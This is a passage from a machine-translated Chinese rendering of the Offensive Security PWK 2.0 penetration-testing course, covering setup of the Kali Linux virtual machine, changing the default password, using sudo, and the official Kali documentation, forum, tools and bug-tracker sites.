<div style="position:absolute;top:38791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.1 启动 Kali Linux</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:38832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，下载官方 Kali Linux 64 位 (amd64) VMware 虚拟机 (VM) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:38852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您选择使用的 VMware 软件。</font><font style="vertical-align: inherit;">VMware 为 VMware WorkStation 提供免费试用</font></font></nobr></div>
<div style="position:absolute;top:38871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于 Mac 的</font><font style="vertical-align: inherit;">Pro </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 VMware Fusion。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用这些商业版本之一的好处是</font></font></nobr></div>
<div style="position:absolute;top:38890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您需要将虚拟机重置为可以恢复的快照的能力</font></font></nobr></div>
<div style="position:absolute;top:38910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">干净的石板。</font><font style="vertical-align: inherit;">VMware 还提供免费版本的软件 VMware WorkStation Player。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21</font></font></font></nobr></div>
<div style="position:absolute;top:38929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，免费版没有快照功能。</font></font></nobr></div>
<div style="position:absolute;top:38962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用 64 位 (amd64) Kali Linux 虚拟机，以便获得最佳结果和一致性</font></font></nobr></div>
<div style="position:absolute;top:38981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于实验室指南，我们建议您也使用它。</font><font style="vertical-align: inherit;">不要偏离这个标准构建</font></font></nobr></div>
<div style="position:absolute;top:39001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这可能会造成与课程培训材料不一致的工作环境。</font></font></nobr></div>
<div style="position:absolute;top:39034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可以找到最新的 Kali Linux 虚拟机映像以及最新的说明来验证</font></font></nobr></div>
<div style="position:absolute;top:39053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Offensive Security 支持网站上下载的存档。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为一名安全专业人士，</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:39151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://kali.training</font></font></font></nobr></div>
<div style="position:absolute;top:39171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://support.offensive-security.com/#!pwk-kali-vm.md</font></font></font></nobr></div>
<div style="position:absolute;top:39191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（VMware，2019 年），https://www.vmware.com/products/workstation-pro.html</font></font></font></nobr></div>
<div style="position:absolute;top:39211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（VMware，2019 年），https://www.vmware.com/products/fusion.html</font></font></font></nobr></div>
<div style="position:absolute;top:39231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（VMware，2019 年），https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html</font></font></font></nobr></div>
<div style="position:absolute;top:39251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://support.offensive-security.com/#!pwk-kali-vm.md</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:39379;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="34"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 34 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:39412;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:40489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:40489;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:40489;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">34</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:39508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在使用之前，您应该始终花时间正确验证您下载的任何文件。</font><font style="vertical-align: inherit;">不做</font></font></nobr></div>
<div style="position:absolute;top:39527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所以会让您和您的客户面临不必要的风险。</font></font></nobr></div>
<div style="position:absolute;top:39560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要使用 Kali Linux 虚拟机，我们将首先解压缩存档并打开 .vmx 文件</font></font></nobr></div>
<div style="position:absolute;top:39579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟机。</font><font style="vertical-align: inherit;">如果出现该选项，请选择“我复制了它”以指示虚拟机生成</font></font></nobr></div>
<div style="position:absolute;top:39599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个新的虚拟 MAC 地址并避免潜在的冲突。</font></font></nobr></div>
<div style="position:absolute;top:39632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟机的默认凭据是：</font></font></nobr></div>
<div style="position:absolute;top:39664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:39664;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名：</font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali</font></font></font></nobr></div>
<div style="position:absolute;top:39693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:39693;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码：</font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:39754;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首次启动时，从终端更改所有默认密码很重要</font></font></i></nobr></div>
<div style="position:absolute;top:39774;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font></i><b><font color="#000000" style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">passwd</font></font></font></b><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">我们正在连接到在线实验室以及其他</font></font></i></nobr></div>
<div style="position:absolute;top:39794;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生和默认密码实际上可以保证顽皮的滥用！</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:39856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要更改密码，请单击终端图标并发出内置的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">passwd</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:39890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">passwd</font></font></font></b></nobr></div>
<div style="position:absolute;top:39907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改kali的密码。</font></font></nobr></div>
<div style="position:absolute;top:39924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（当前）UNIX 密码： </font></font></nobr></div>
<div style="position:absolute;top:39941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入新的 UNIX 密码： </font></font></nobr></div>
<div style="position:absolute;top:39958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重新输入新的 UNIX 密码： </font></font></nobr></div>
<div style="position:absolute;top:39975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">passwd：密码更新成功</font></font></nobr></div>
<div style="position:absolute;top:39995;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1 - 更改 kali 用户的默认密码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 虚拟机将包含两个默认用户，“root”和“kali”。</font><font style="vertical-align: inherit;">我们将使用卡利</font></font></nobr></div>
<div style="position:absolute;top:40043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户帐号。</font><font style="vertical-align: inherit;">虽然以 root 用户身份登录可能很诱人，但不建议这样做。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:40063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root 用户拥有不受限制的访问权限，一个错误的命令可能会损坏我们的系统。</font><font style="vertical-align: inherit;">最糟糕的是，如果</font></font></nobr></div>
<div style="position:absolute;top:40082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对手将利用以 root 身份运行的进程，他们将完全控制我们的</font></font></nobr></div>
<div style="position:absolute;top:40101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
<div style="position:absolute;top:40134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">许多命令需要提升权限才能运行，幸运的是，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令可以</font></font></nobr></div>
<div style="position:absolute;top:40154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克服这个问题。</font><font style="vertical-align: inherit;">我们输入</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后跟我们希望运行的命令并提供我们的</font></font></nobr></div>
<div style="position:absolute;top:40173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提示时输入密码。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
<div style="position:absolute;top:40225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利</font></font></nobr></div>
<div style="position:absolute;top:40259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo whoami</font></font></font></b></nobr></div>
<div style="position:absolute;top:40276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[sudo] 卡利密码：</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:40293;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:40312;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 2 - 使用 sudo 以 root 身份运行命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，探索 VMware 的快照功能，它允许我们将虚拟机恢复或重置为</font></font></nobr></div>
<div style="position:absolute;top:40361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一张白纸。</font><font style="vertical-align: inherit;">如果出现问题，定期快照可以节省大量时间和挫折</font></font></nobr></div>
<div style="position:absolute;top:40380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:40567;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="35"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 35 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:40600;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:41677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:41677;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:41677;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">35</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:40696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.2 Kali 菜单</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:40737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 菜单包括发行版中许多工具的分类链接。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:40757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结构有助于阐明每个工具的主要作用及其使用的上下文。</font></font></nobr></div>
<div style="position:absolute;top:40789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">花一些时间浏览 Kali Linux 菜单，以帮助您熟悉可用的工具</font></font></nobr></div>
<div style="position:absolute;top:40809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及它们的类别。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:41322;left:392"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 3：Kali 菜单</font></font></i></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:41355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3 Kali 文档</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:41397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为一个成熟的操作系统，Kali Linux 提供了许多我们无法做到的特性和功能</font></font></nobr></div>
<div style="position:absolute;top:41417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本课程中充分探索。</font><font style="vertical-align: inherit;">但是，有几个官方的 Kali Linux 资源可用于</font></font></nobr></div>
<div style="position:absolute;top:41436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进一步研究和研究：</font></font></nobr></div>
<div style="position:absolute;top:41469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:41469;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 官方文档</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23</font></font></font></nobr></div>
<div style="position:absolute;top:41497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:41497;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 支持论坛</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:41607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），http://docs.kali.org</font></font></font></nobr></div>
<div style="position:absolute;top:41627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://forums.kali.org</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:41755;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="36"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 36 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:41788;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:42865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:42865;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:42865;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">36</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:41884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:41884;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 工具站点</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25</font></font></font></nobr></div>
<div style="position:absolute;top:41912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:41912;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 漏洞追踪器</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">26</font></font></font></nobr></div>
<div style="position:absolute;top:41940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:41940;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 培训</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">27</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:41975;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3.1 Kali Linux 官方文档</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:42013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Docs 网站，</font><font style="vertical-align: inherit;">顾名思义是</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">28</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，是 Kali Linux 的官方文档库。</font></font></nobr></div>
<div style="position:absolute;top:42032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该站点提供了最新的 Kali 文档，详细介绍了许多常见程序，以及</font></font></nobr></div>
<div style="position:absolute;top:42052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该被认为是 Kali Linux 故障排除和支持的第一站。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:42086;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3.2 Kali Linux 支持论坛</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:42124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">故障排除和支持的下一站是 Kali Linux 支持论坛。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">29</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发帖前，</font></font></nobr></div>
<div style="position:absolute;top:42143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阅读论坛规则和指南</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">30，</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为不合规的帖子通常会被审核或忽略。</font></font></nobr></div>
<div style="position:absolute;top:42163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在创建新主题之前，请务必在论坛中彻底搜索以前发布的</font></font></nobr></div>
<div style="position:absolute;top:42182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解决方案。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:42216;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3.3 Kali Linux 工具站点</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:42254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali 具有来自安全和取证各个领域的许多渗透测试工具</font></font></nobr></div>
<div style="position:absolute;top:42274;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域。</font><font style="vertical-align: inherit;">Kali Tools 站点</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">31</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">旨在列出所有这些并为每个提供快速参考。</font><font style="vertical-align: inherit;">版本</font></font></nobr></div>
<div style="position:absolute;top:42293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的工具可以根据其上游来源进行跟踪。</font><font style="vertical-align: inherit;">此外，关于每个</font></font></nobr></div>
<div style="position:absolute;top:42313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">元包也可用。</font><font style="vertical-align: inherit;">元包提供了安装特定子集的灵活性</font></font></nobr></div>
<div style="position:absolute;top:42332;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于特定需求的工具，包括无线、Web 应用程序、取证、软件定义</font></font></nobr></div>
<div style="position:absolute;top:42351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收音机等等。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:42386;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3.4 Kali Linux 漏洞追踪器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:42423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有时，某些工具可能会崩溃或产生意外结果。</font><font style="vertical-align: inherit;">发生这种情况时，搜索</font></font></nobr></div>
<div style="position:absolute;top:42443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于 Kali Linux Bug Tracker 站点</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">32</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上给定的错误消息，</font><font style="vertical-align: inherit;">可能有助于确定是否</font></font></nobr></div>
<div style="position:absolute;top:42462;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不是问题是错误，如果是，如何解决。</font><font style="vertical-align: inherit;">用户还可以通过以下方式帮助社区</font></font></nobr></div>
<div style="position:absolute;top:42482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过网站报告错误。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:42516;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3.5 Kali 训练场</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:42554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux Training </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">33</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">站点提供官方 Kali Linux 手册和培训课程。</font><font style="vertical-align: inherit;">这个免费网站</font></font></nobr></div>
<div style="position:absolute;top:42573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 Kali Linux Revealed </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">34</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">书籍，并以 HTML 和 PDF 格式托管书籍内容，</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:42635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://tools.kali.org</font></font></font></nobr></div>
<div style="position:absolute;top:42655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">26 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://bugs.kali.org</font></font></font></nobr></div>
<div style="position:absolute;top:42675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">27 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://kali.training</font></font></font></nobr></div>
<div style="position:absolute;top:42695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">28 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），http://docs.kali.org</font></font></font></nobr></div>
<div style="position:absolute;top:42715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">29 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（攻势安全，2019 年），https://forums.kali.org</font></font></font></nobr></div>
<div style="position:absolute;top:42735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">30 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://forums.kali.org/forumdisplay.php?12-Forums-Rules-and-Guidelines</font></font></font></nobr></div>
